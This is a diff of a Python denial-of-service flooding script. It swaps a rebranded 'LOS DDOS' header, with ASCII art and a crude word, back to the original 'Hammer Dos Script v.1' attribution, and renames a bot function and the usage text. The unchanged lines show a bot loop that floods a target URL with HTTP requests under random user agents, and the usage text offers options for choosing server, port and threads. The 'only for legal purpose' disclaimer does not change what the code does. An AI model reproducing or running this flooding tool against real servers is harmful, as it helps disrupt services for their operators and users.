@@ -1,26 +1,9 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-
-#######################################################################
-#██▓     ▒█████    ██████    ▓█████▄ ▓█████▄  ▒█████    ██████ #
-#▓██▒    ▒██▒  ██▒▒██    ▒    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ #
-#▒██░    ▒██░  ██▒░ ▓██▄      ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   #
-#▒██░    ▒██   ██░  ▒   ██▒   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒#
-#░██████▒░ ████▓▒░▒██████▒▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒#
-#░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░.  #
-#░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░.     #
-#  ░ ░   ░ ░ ░ ▒  ░  ░  ░      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░         #
-#    ░  ░    ░ ░        ░        ░       ░        ░ ░        ░            #
-                              ░       ░                                     #
-#############################################################################
-
-
-
-
-# python 3.3.2+ LOS DDOS 
-# by KAKASHIMAKER & AZRAEL A LENDA
-# PÊNIS
+# python 3.3.2+ Hammer Dos Script v.1
+# by Can Yalçın
+# only for legal purpose
 
 
 from queue import Queue
@@ -48,11 +31,11 @@ def my_bots():
 	return(bots)
 
 
-def bot_losing(url):
+def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is Kakashi...\033[0m")
+			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -92,10 +75,10 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92] maior Du mundo http://www.canyalcin.com/
+	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 LosDdosAtraso.py [-s] [-p] [-t]
+	usage : python3 hammer.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
